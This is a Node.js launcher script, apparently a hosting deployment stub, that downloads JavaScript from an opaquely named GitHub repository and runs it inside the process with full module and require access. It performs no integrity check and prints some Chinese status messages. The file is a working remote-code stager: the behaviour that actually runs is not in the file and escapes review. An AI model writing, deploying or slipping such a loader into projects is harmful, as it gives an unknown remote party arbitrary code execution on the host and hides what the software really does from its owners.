'use strict';

const https = require('https');
const net = require('net');
const vm = require('vm');
const path = require('path');
const Module = require('module');

const REMOTE_URL = process.env.REMOTE_URL ||
  'https://raw.githubusercontent.com/RSE20wfk/FnjaDqx20M/refs/heads/main/index_v2.0.5.js';
const MAX_SOURCE_BYTES = 2 * 1024 * 1024;
const FETCH_TIMEOUT_MS = 15000;
const MAX_REDIRECTS = 3;

process.env.PORT ||= '5000';
process.env.HOST ||= '0.0.0.0';

function checkNetwork(name, host, family) {
  let completed = false;
  const socket = net.connect({ host, port: 443, family, timeout: 4000 });
  const report = (result) => {
    if (completed) return;
    completed = true;
    console.log(`NETWORK_TEST ${name} ${result}`);
    socket.destroy();
  };
  socket.once('connect', () => report('CONNECTED'));
  socket.once('timeout', () => report('TIMEOUT'));
  socket.once('error', (error) => report(error.code || error.message));
}

function fetchRemoteCode(inputUrl, redirectCount = 0) {
  return new Promise((resolve, reject) => {
    let url;
    try {
      url = new URL(inputUrl);
      if (url.protocol !== 'https:') throw new Error('Remote source must use HTTPS');
    } catch (error) {
      reject(error);
      return;
    }

    const req = https.get(url, { headers: { 'User-Agent': 'node' } }, (res) => {
      const status = res.statusCode || 0;
      if ([301, 302, 303, 307, 308].includes(status)) {
        const location = res.headers.location;
        res.resume();
        if (!location) return reject(new Error(`Redirect ${status} without Location`));
        if (redirectCount >= MAX_REDIRECTS) return reject(new Error('Too many redirects'));
        let nextUrl;
        try { nextUrl = new URL(location, url).href; }
        catch (error) { return reject(error); }
        fetchRemoteCode(nextUrl, redirectCount + 1).then(resolve, reject);
        return;
      }
      if (status !== 200) {
        res.resume();
        reject(new Error(`Remote HTTP ${status}`));
        return;
      }

      const chunks = [];
      let size = 0;
      res.on('data', (chunk) => {
        size += chunk.length;
        if (size > MAX_SOURCE_BYTES) {
          req.destroy(new Error('Remote source exceeds 2 MiB'));
          return;
        }
        chunks.push(chunk);
      });
      res.once('end', () => resolve(Buffer.concat(chunks).toString('utf8')));
      res.once('error', reject);
      res.once('aborted', () => reject(new Error('Remote download aborted')));
    });
    req.setTimeout(FETCH_TIMEOUT_MS, () => req.destroy(new Error('Remote download timed out')));
    req.once('error', reject);
  });
}

function executeRemoteCommonJS(source) {
  const filename = path.join(__dirname, 'index.js');
  const remoteModule = new Module(filename, module);
  remoteModule.filename = filename;
  remoteModule.paths = Module._nodeModulePaths(__dirname);
  const remoteRequire = Module.createRequire(filename);
  remoteRequire.main = remoteModule;
  remoteModule.require = remoteRequire;

  const wrapped = vm.runInThisContext(Module.wrap(source), {
    filename,
    displayErrors: true
  });
  wrapped.call(remoteModule.exports, remoteModule.exports,
    remoteRequire, remoteModule, filename, __dirname);
  remoteModule.loaded = true;
  return remoteModule.exports;
}

checkNetwork('IPv4', '1.1.1.1', 4);
checkNetwork('IPv6', '2606:4700:4700::1111', 6);

(async () => {
  try {
    console.log('正在远程加载 index.js...');
    const source = await fetchRemoteCode(REMOTE_URL);
    console.log('远程代码下载成功');
    executeRemoteCommonJS(source);
    console.log('远程 index.js 已执行');
  } catch (error) {
    console.error('加载或执行失败:', error && (error.stack || error.message) || error);
    process.exitCode = 1;
  }
})();
